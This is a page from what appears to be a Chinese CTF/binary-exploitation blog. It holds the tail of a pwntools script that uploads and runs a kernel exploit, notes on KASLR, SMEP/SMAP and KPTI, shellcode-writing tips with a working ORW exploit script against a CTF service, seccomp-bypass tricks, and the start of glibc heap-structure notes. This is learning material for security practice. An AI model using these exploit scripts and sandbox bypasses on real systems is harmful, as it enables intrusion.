class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">11451</span>)  <span class="comment">#连接远程地址</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./run.sh&#x27;)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        log.info(<span class="string">&quot;count: &quot;</span> + <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;/tmp/exploit &quot;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="常见保护机制"><a href="#常见保护机制" class="headerlink" title="常见保护机制"></a>常见保护机制</h2><h3 id="KASLR-保护"><a href="#KASLR-保护" class="headerlink" title="KASLR 保护"></a>KASLR 保护</h3><p>KASLR（Kernel Address Space Layout Randomization）是一种用于保护操作系统内核的安全技术。它通过在系统启动时随机化内核地址空间的布局来防止攻击者确定内核中的精确地址</p>
<blockquote>
<p>值得注意的是随机方式是通过<code>函数基地址 +随机值=内存运行地址</code>方式来随机化 </p>
<p>本质上与用户态的aslr绕过思路相近，通过泄露地址活的基址</p>
</blockquote>
<p>这里贴出实现的原理：</p>
<ol>
<li><p><strong>引导阶段</strong>：</p>
<ul>
<li>引导加载程序在将内核镜像加载到内存时，会选择一个随机的物理地址偏移。</li>
<li>这个偏移量通常被称为“KASLR偏移”。</li>
</ul>
</li>
<li><p><strong>内核重定位</strong>：</p>
<ul>
<li>内核启动早期，在建立页表之前，会应用这个随机偏移。</li>
<li>内核需要具备<strong>位置无关</strong>或<strong>可重定位</strong>的能力，能够正确处理自身地址的变动。这意味着内核在编译时需要使用<code>-fPIC</code>等选项，并且内部的<strong>重定位表</strong>需要被正确处理。</li>
<li>最终，内核的虚拟地址（在x86_64上，通常是<code>0xffffffff80000000</code>开始的-2GB空间）也会被加上这个随机偏移。</li>
</ul>
<blockquote>
<p>这里的重定位表和PE&#x2F;ELF文件中的并无差别！</p>
</blockquote>
</li>
</ol>
<h3 id="SMEP-SMAP保护"><a href="#SMEP-SMAP保护" class="headerlink" title="SMEP&amp;SMAP保护"></a>SMEP&amp;SMAP保护</h3><p>通过在CR4寄存器中定位其中两个bit位，代表内核是否开启保护</p>
<ul>
<li>SMEP：控制内核态不能执行用户态的shellcode</li>
<li>SMAP：控制用户态空间的指针不能被内核态解引用，即不能访问内核空间中的敏感信息</li>
</ul>
<blockquote>
<p>CR4控制了CPU的<strong>工作模式和安全特性</strong>，内核统一管理所有CPU的CR4（策略保持一致）</p>
</blockquote>
<p><img src="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"></p>
<h3 id="KPTI保护"><a href="#KPTI保护" class="headerlink" title="KPTI保护"></a>KPTI保护</h3><p>kernel page-table isolation(内核页表隔离),通过完全分离用户空间与内核空间页表来解决页表泄露。</p>
<p>一旦开启了 KPTI,由于内核态和用户态的页表不同，所以如果使用 ret2user或内核执行 ROP返回用户态时，由于内核态无法确定用户态的页表，就会报出一个段错误。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/30/shellcode-tips/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/30/shellcode-tips/" class="post-title-link" itemprop="url">shellcode_tips(持续更新版)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-10-30 16:37:07 / 修改时间：19:54:22" itemprop="dateCreated datePublished" datetime="2025-10-30T16:37:07+08:00">2025-10-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过"><a href="#本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过" class="headerlink" title="本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过"></a>本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过</h2><blockquote>
<p>鉴于本人汇编基础较弱，目前在持续学习中，如有不正确或含糊的表述，欢迎联系我与我讨论！</p>
</blockquote>
<p>Shellcode的编写在二进制安全中是不可避免的，当回归到汇编这种较为底层的语言去实现一些特定功能时，我们往往会发现不只有一种方法能够实现我们的目的。这里我就拿64位中实现 <code>read(0,0x404000,0x50)</code>来举例子：</p>
<p>1.最直接的传值syscall</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rax, 0          ; sys_read 系统调用号</span><br><span class="line">    mov rdi, 0          ; fd = 0 (stdin)</span><br><span class="line">    mov rsi, 0x404000   ; buf = 0x404000</span><br><span class="line">    mov rdx, 0x50       ; count = 0x50</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>2.利用栈传值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    push 0x50           ; count</span><br><span class="line">    push 0x404000       ; buf</span><br><span class="line">    push 0              ; fd</span><br><span class="line">    </span><br><span class="line">    pop rdi             ; fd</span><br><span class="line">    pop rsi             ; buf</span><br><span class="line">    pop rdx             ; count</span><br><span class="line">    </span><br><span class="line">    mov rax, 0          ; sys_read</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>3.切换到32位操作模式，用中断门调用read操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">[bits 64]</span><br><span class="line">_start:</span><br><span class="line">    ; 直接使用远返回到32位模式</span><br><span class="line">    push 0x2b           ; 32位CS</span><br><span class="line">    push code32         ; 32位EIP</span><br><span class="line">    retfq               ; 远返回</span><br><span class="line"></span><br><span class="line">[bits 32]</span><br><span class="line">code32:</span><br><span class="line">    ; 手动设置32位栈</span><br><span class="line">    mov esp, 0x7fffe000</span><br><span class="line">    </span><br><span class="line">    ; 32位系统调用</span><br><span class="line">    mov eax, 3          ; sys_read</span><br><span class="line">    mov ebx, 0          ; stdin</span><br><span class="line">    mov ecx, 0x404000   ; buffer</span><br><span class="line">    mov edx, 0x50       ; size</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    mov eax, 1          ; sys_exit</span><br><span class="line">    mov ebx, 0</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>

<p>可以看到汇编的灵活性是非常大的，当然在实战中对于shellcode的编写往往存在着各种各样的限制，比如长度有限，shellcode分割，沙箱保护，特定字符检测等等。通过汇编的灵活性，在某些情况下能够绕过重重难关从而达到我们的目的。</p>
<h3 id="优化shellcode的长度"><a href="#优化shellcode的长度" class="headerlink" title="优化shellcode的长度"></a>优化shellcode的长度</h3><p>列一下常见的64位指令长度</p>
<h6 id="栈的操作"><a href="#栈的操作" class="headerlink" title="栈的操作"></a>栈的操作</h6><ul>
<li>pop&#x2F;push reg 1字节</li>
<li>push imm 1+立即数的字节数(1&#x2F;2&#x2F;4)</li>
</ul>
<h6 id="赋值-计算操作"><a href="#赋值-计算操作" class="headerlink" title="赋值&#x2F;计算操作"></a>赋值&#x2F;计算操作</h6><ul>
<li>Inc&#x2F;dec reg 字节</li>
<li>mov&#x2F;add reg64，reg64     2字节</li>
<li>mov&#x2F;add reg, [reg]             3字节</li>
<li>mov&#x2F;add reg, imm32          5字节</li>
<li>mov&#x2F;add reg64, imm32      7字节</li>
<li>mov&#x2F;add reg64, imm64      10字节</li>
</ul>
<h6 id="程序流"><a href="#程序流" class="headerlink" title="程序流"></a>程序流</h6><ul>
<li>ret  1字节</li>
<li>syscall 2字节</li>
<li>jmp等跳转 short 2字节</li>
<li>jmp&#x2F;call rel32  5字节</li>
</ul>
<p>经过对比栈操作与赋值的指令，发现当使用 <code>push imm</code> + <code>pop reg</code> 替代 &#96;mov reg, imm会使汇编更加精简。同时在jmp到shellcode前的上下文也是我们需要观察的，对于栈，寄存器上的数据没准我们就能利用上来减少shellcode的长度。</p>
<p>例子待补充</p>
<h3 id="shellcode分块"><a href="#shellcode分块" class="headerlink" title="shellcode分块"></a>shellcode分块</h3><p>有些情景下我们不具备写入连续内容的能力，那么需要将我们写入的shellcode<code>拼凑</code>到一起从而形成一段完整的执行链。这里需要用到相对跳转，也就是<code>jmp $+0x8</code>：这段汇编的意思为跳转到当前eip+0x8的地址上去执行，其汇编拆解便是EB 08</p>
<ul>
<li><code>EB</code>: 短跳转操作码</li>
<li><code>08</code>: 相对偏移量（从下条指令开始计算）</li>
</ul>
<p>在知道对应内存块的相对位移的情况下(通常来说只要位于同一内存段偏移一般固定)在每个内存块尾部加上这么一条相对跳转指令即可</p>
<p>题目试例：</p>
<p>西电mini的checkin题</p>
<p>题目的大致执行流程是向三块堆空间中分别读取0x18数据，然后将堆空间变成可执行的，并跳到第一个堆块空间，题目开了沙箱ban掉execve系统调用。</p>
<p><img src="/2025/10/30/shellcode-tips/1.png"></p>
<p>非常直球的题目，要在三段堆空间构造orw的shellcode。动调查看三个堆块之间的相对偏移（这个是固定的），在每一段shellcode末尾加上jmp $x即可</p>
<p>poc脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;16296&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc_open=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f</span></span><br><span class="line"><span class="string">    push rax /* &#x27;/flag&#x27; */</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sc_open)))</span><br><span class="line">sc_read=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* read(fd, stack, 0x100) */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax         /* 返回的fd 3*/</span></span><br><span class="line"><span class="string">    mov rsi, rsp         /* 读取到栈上 3*/</span></span><br><span class="line"><span class="string">    push 0x50</span></span><br><span class="line"><span class="string">    pop rdx        /*读取0x50字节 1*/</span></span><br><span class="line"><span class="string">    xor rax, rax         /* SYS_read = 0  占3字节*/</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sc_read)))</span><br><span class="line">sc_write=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* write(1, stack, rax) */</span></span><br><span class="line"><span class="string">    mov rdi, 1          /* stdout = 1 */</span></span><br><span class="line"><span class="string">    mov rax, 1          /* SYS_write = 1 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sc_write)))</span><br><span class="line"><span class="comment"># p=process(&#x27;./checkin&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;10.21.162.149&#x27;</span>,<span class="number">55771</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;signin~\n&quot;</span>)</span><br><span class="line">p.send(sc_open.ljust(<span class="number">0x16</span>,<span class="string">b&#x27;\x90&#x27;</span>)+asm(<span class="string">&#x27;jmp $+0xa&#x27;</span>))</span><br><span class="line">p.send(sc_read.ljust(<span class="number">0x16</span>,<span class="string">b&#x27;\x90&#x27;</span>)+asm(<span class="string">&#x27;jmp $+0xa&#x27;</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(sc_write.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x90&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Gashat!\n\n&quot;</span>)</span><br><span class="line">flag=p.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="绕过特定字符的检查"><a href="#绕过特定字符的检查" class="headerlink" title="绕过特定字符的检查"></a>绕过特定字符的检查</h3><p>有些情况下，题目会对于你输入的shellcode进行某些检查，我们需要调整我们的shellcode进行检测绕过。</p>
<ul>
<li><h6 id="有些题目会先strlen-inputshellcode-得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在-x00的汇编-前提是读取shellcode时没有-x00截断-，这样检测实际上检测的内容是-x00前面的内容。而后面的shellcode就可以自由发挥啦"><a href="#有些题目会先strlen-inputshellcode-得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在-x00的汇编-前提是读取shellcode时没有-x00截断-，这样检测实际上检测的内容是-x00前面的内容。而后面的shellcode就可以自由发挥啦" class="headerlink" title="有些题目会先strlen(inputshellcode)得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在\x00的汇编(前提是读取shellcode时没有\x00截断)，这样检测实际上检测的内容是\x00前面的内容。而后面的shellcode就可以自由发挥啦"></a>有些题目会先strlen(inputshellcode)得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在\x00的汇编(前提是读取shellcode时没有\x00截断)，这样检测实际上检测的内容是\x00前面的内容。而后面的shellcode就可以自由发挥啦</h6></li>
</ul>
<p>例子待补充</p>
<h3 id="突破沙箱的限制"><a href="#突破沙箱的限制" class="headerlink" title="突破沙箱的限制"></a>突破沙箱的限制</h3><p>在题目中遇到沙箱ban掉一些特定的系统调用的情况在ctf中屡见不鲜，沙箱的规则制定相对自由，不同题目可以不同组合ban，记录一下目前接触到的突破沙箱构造法</p>
<h4 id="等价函数替换"><a href="#等价函数替换" class="headerlink" title="等价函数替换"></a>等价函数替换</h4><p>一系列可能用到的等价替换函数：</p>
<ul>
<li><p>使用 <code>execveat</code> 代替 <code>execve</code></p>
</li>
<li><p>使用 <code>openat</code> 代替 <code>open</code></p>
</li>
<li><p>使用 <code>readv/writev</code> 代替 <code>read/write</code></p>
</li>
<li><p>使用 <code>mmap2</code> 代替 <code>mmap</code></p>
</li>
<li><p>orw中，使用 <code>sendfile</code>，代替 <code>read/write</code></p>
</li>
</ul>
<h4 id="切换指令模式绕过黑名单"><a href="#切换指令模式绕过黑名单" class="headerlink" title="切换指令模式绕过黑名单"></a>切换指令模式绕过黑名单</h4><p>当seccomp-tool工具发现沙箱中没有判断指令模式并且采取的是黑名单ban的模式，那么我们可以通过长返回retf的方式来实现架构切换。因为32位与64位同一个系统调用的调用号是不同的。</p>
<p>注意构造retf的栈布局：64——&gt;32位shellcode模版</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor esp, esp</span><br><span class="line">mov rsp, 0x400100</span><br><span class="line">mov eax, 0x23 ; cs</span><br><span class="line">mov [rsp+4], eax</span><br><span class="line">mov eax, 0x400800 ; ip</span><br><span class="line">mov [rsp], eax</span><br><span class="line">retf</span><br></pre></td></tr></table></figure>

<h3 id="纯ascii码shellcode"><a href="#纯ascii码shellcode" class="headerlink" title="纯ascii码shellcode"></a>纯ascii码shellcode</h3><p>这部分我还没碰到到过，这里有篇还没啃的blog：<a target="_blank" rel="noopener" href="https://nets.ec/Ascii_shellcode">https://nets.ec/Ascii_shellcode</a></p>
<p>这部分感觉技巧性很强，多用xor，inc，dec等精细到字的操作，对于shellcode水平要求很高，我如果真遇到应该也是试试工具了(雾</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/" class="post-title-link" itemprop="url">堆管理结构的利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-26 12:48:41" itemprop="dateCreated datePublished" datetime="2025-10-26T12:48:41+08:00">2025-10-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-29 20:15:31" itemprop="dateModified" datetime="2025-10-29T20:15:31+08:00">2025-10-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在面试中被问到unsortedbin attack的写入值的意义，知道是<code>main_areana+88</code>的位置，但是具体的意义以及利用方式却没有深究过。记录一下对于两个堆管理结构的学习笔记：<code>main_arena</code>以及<code>tcache_perthread_struct</code>的结构学习</p>
<h2 id="Main-arena"><a href="#Main-arena" class="headerlink" title="Main_arena"></a>Main_arena</h2><p>全局一个，位于glibc模块的内存附近，用于管理进程中主堆(用sbrk分配)，是arena环形链表的头节点。arena环形链表的非头节点为<code>thread arena</code>,通过mmap分配。</p>
<h4 id="libc中对于main-rena的定义"><a href="#libc中对于main-rena的定义" class="headerlink" title="libc中对于main_rena的定义"></a>libc中对于main_rena的定义</h4><p>这里用的是2.35的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __libc_lock_define (, mutex); <span class="comment">//锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags; <span class="comment">//标志位</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> have_fastchunks; <span class="comment">//快速判断fastbin是后有chunk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS]; <span class="comment">//各个size的fastbin首地址</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top; <span class="comment">//指向top_chunk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;  <span class="comment">//最近unsortedbin分配剩余的chunk地址</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>]; <span class="comment">//记录bins的信息</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span> <span class="comment">//指向arena链的后一个arena</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span> <span class="comment">//管理未被线程使用的空闲 arena</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads; <span class="comment">//记录使用此 arena 的线程数量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trim_threshold;    <span class="comment">// 收缩堆的阈值</span></span><br><span class="line">  INTERNAL_SIZE_T top_pad;         <span class="comment">// top chunk的额外填充</span></span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;  <span class="comment">// 使用mmap的阈值</span></span><br><span class="line">  INTERNAL_SIZE_T arena_test;      <span class="comment">// arena测试值</span></span><br><span class="line">  INTERNAL_SIZE_T arena_max;       <span class="comment">// arena最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line">  <span class="comment">/* Transparent Large Page support.  */</span></span><br><span class="line">  INTERNAL_SIZE_T thp_pagesize;    <span class="comment">// 透明大页大小</span></span><br><span class="line">  INTERNAL_SIZE_T hp_pagesize;     <span class="comment">// 大页大小</span></span><br><span class="line">  <span class="type">int</span> hp_flags;                    <span class="comment">// 大页标志</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map 